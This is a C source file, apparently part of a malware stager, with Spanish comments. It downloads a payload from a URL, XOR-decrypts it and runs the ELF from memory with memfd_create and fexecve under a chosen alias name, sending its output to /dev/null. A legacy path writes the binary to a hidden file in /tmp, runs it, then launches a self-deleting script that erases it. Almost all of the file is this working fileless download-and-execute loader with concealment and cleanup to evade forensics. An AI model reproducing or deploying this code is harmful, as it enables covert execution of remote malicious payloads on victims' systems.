#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>
#include <sys/wait.h>
#include "download.h"
#include "debug.h"
#include "util.h"



#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

#ifdef LEGACY_COMPILATION
// Para sistemas legacy
#define TEMP_FILENAME "/tmp/.tmp_file"
#define SCRIPT_FILENAME "/tmp/.cleanup.sh"

void create_and_run_cleanup_script() {
    // Crear el script de Bash
    FILE *script = fopen(SCRIPT_FILENAME, "w");
    if (script == NULL) {
        perror("fopen");
        exit(EXIT_FAILURE);
    }

    fprintf(script, "#!/bin/bash\n");
    fprintf(script, "sleep %d\n", 5);
    fprintf(script, "rm -f \"%s\"\n", TEMP_FILENAME);
    fprintf(script, "rm -- ${0}\n");


    fclose(script);


    if (chmod(SCRIPT_FILENAME, 0755) == -1) {
        perror("chmod");
        exit(EXIT_FAILURE);
    }


    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    }
    if (pid == 0) {
        execl("/bin/bash", "bash", SCRIPT_FILENAME, (char *)NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    }else {

        int status;
        if (waitpid(pid, &status, 0) == -1) {
            perror("waitpid");
        }
    }

}

void ensure_clean_temp_file(const char *filename) {
    if (access(filename, F_OK) == 0) {

        if (unlink(filename) == -1) {
            perror("unlink");
            exit(EXIT_FAILURE);
        }
    }
}

#else

#ifndef memfd_create
#include <linux/memfd.h>
#include <sys/syscall.h>
#define memfd_create(name, flags) syscall(SYS_memfd_create, name, flags)
#endif

#endif




void execute_elf_from_memory(struct MemoryStruct *mem,const char *alias_name) {
    pid_t pid = fork();
    if (pid == 0) {

        int dev_null = open("/dev/null", O_RDWR);
        if (dev_null == -1) {
            perror("open /dev/null");
            exit(EXIT_FAILURE);
        }

        if (dup2(dev_null, STDOUT_FILENO) == -1 || dup2(dev_null, STDERR_FILENO) == -1) {
            perror("dup2");
            close(dev_null);
            exit(EXIT_FAILURE);
        }
        
        close(dev_null);  

        int fd;

#ifdef LEGACY_COMPILATION
        ensure_clean_temp_file(TEMP_FILENAME);

        fd = open(TEMP_FILENAME, O_RDWR | O_CREAT | O_TRUNC, S_IRWXU);
        if (fd == -1) {
            perror("mkstemp");
            exit(EXIT_FAILURE);
        }

        if (write(fd, mem->memory, mem->size) != mem->size) {
            perror("write");
            close(fd);
            unlink(TEMP_FILENAME);
            exit(EXIT_FAILURE);
        }

        if (chmod(TEMP_FILENAME, S_IRWXU) == -1) {
            perror("chmod");
            close(fd);
            unlink(TEMP_FILENAME);
            exit(EXIT_FAILURE);
        }

        close(fd);


#else
        fd = memfd_create("elf_memfd", MFD_CLOEXEC);
        if (fd == -1) {
            perror("memfd_create");
            exit(EXIT_FAILURE);
        }
        if (write(fd, mem->memory, mem->size) != mem->size) {
            perror("write");
            exit(EXIT_FAILURE);
        }
#endif
        // Obtener las variables de entorno del proceso padre
        extern char **environ;

        char *const argv[] = { (char *)alias_name, NULL };

#ifdef LEGACY_COMPILATION
        if (execve(TEMP_FILENAME, argv, environ) == -1) {
            perror("execve");
            close(fd);
            exit(EXIT_FAILURE);
        }

#else
        fexecve(fd, argv, environ);
        perror("fexecve");
#endif
        close(fd);
        exit(EXIT_FAILURE);  // En caso de error

    } else if (pid > 0) {
        DEBUG_PRINT("Child process (PID: %d) running the ELF in the background.\n", pid);

#ifdef LEGACY_COMPILATION
        pid_t cleanup_pid = fork();
        if (cleanup_pid == -1) {
            perror("fork");
            exit(EXIT_FAILURE);
        }
        if (cleanup_pid == 0) {
            create_and_run_cleanup_script();
            exit(EXIT_SUCCESS);
        } else {
            int status;
            if (waitpid(cleanup_pid, &status, 0) == -1) {
                perror("waitpid");
            }
        }
#endif
    } else {
        perror("fork");
        exit(EXIT_FAILURE);
    }
}

void run_elf_executable(const char* url,const char* key,const char *alias_name) {
    struct MemoryStruct mem;
    mem.memory = NULL;
    mem.size = 0;

    if(! is_url_active(url)){
        DEBUG_PRINT("Inactive URL: %s\n", url); 
        exit(1);
    }

    download(url, &mem);

    xor_encrypt_decrypt(mem.memory, mem.size,key);

    execute_elf_from_memory(&mem,alias_name);

    if (mem.memory) free(mem.memory);
}